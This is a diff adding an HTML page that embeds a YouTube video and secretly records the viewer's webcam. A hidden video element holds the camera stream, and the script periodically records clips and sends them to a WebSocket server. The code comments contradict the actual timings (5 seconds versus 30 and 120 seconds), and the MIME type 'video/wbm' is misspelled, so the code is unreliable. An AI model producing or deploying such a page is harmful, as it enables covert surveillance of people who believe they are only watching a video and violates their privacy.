@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube and Automatic Video Capture</title>
+    <style>
+        #container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        video, iframe {
+            width: 100%;
+            max-width: 500px;
+            height: auto;
+        }
+    </style>
+</head>
+<body>
+    <div id="container">
+        <iframe id="youtube-video" src="https://www.youtube.com/embed/YOUR_VIDEO_ID" frameborder="0" allowfullscreen></iframe>
+        <video id="video" autoplay muted style="display:none;"></video>
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const ws = new WebSocket('ws://localhost:3000'); // Replace with your server's WebSocket URL
+
+        // Access the camera
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                video.srcObject = stream;
+                video.play();
+
+                // Automatically capture video every 5 seconds
+                setInterval(captureAndSendVideo, 30000);
+            })
+            .catch(function(err) {
+                console.error("Error accessing camera: " + err);
+            });
+        } else {
+            alert("getUserMedia not supported on your browser!");
+        }
+
+        function captureAndSendVideo() {
+            const chunks = [];
+            const mediaRecorder = new MediaRecorder(video.srcObject);
+
+            mediaRecorder.ondataavailable = function(event) {
+                if (event.data.size > 0) {
+                    chunks.push(event.data);
+                }
+            };
+
+            mediaRecorder.onstop = function() {
+                const blob = new Blob(chunks, { type: 'video/wbm' });
+                blob.arrayBuffer().then(buffer => {
+                    ws.send(buffer); // Send the video buffer through WebSocket
+                });
+            };
+
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 120000); // Capture video for 5 seconds
+        }
+    </script>
+</body>
+</html>
